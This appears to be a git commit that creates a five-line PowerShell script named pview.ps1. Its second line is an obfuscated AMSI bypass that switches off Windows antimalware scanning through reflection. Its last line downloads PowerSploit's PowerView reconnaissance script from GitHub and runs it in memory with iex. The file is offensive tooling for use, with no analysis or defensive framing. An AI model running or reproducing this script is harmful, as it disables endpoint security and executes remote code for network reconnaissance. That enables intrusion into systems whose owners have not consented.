0870ba1b2ea3490f87743828c05039c0503dee5f
Raina Freeman <90727927+raf1843@users.noreply.github.com>
2023-11-08 22:57:35 -0500

    Create pview.ps1

---
+++ pview.ps1
@@ -0,0 +1,5 @@
+# May have to copy-paste this part out and run first
+[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
+# ^ Credit to: https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560
+
+iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
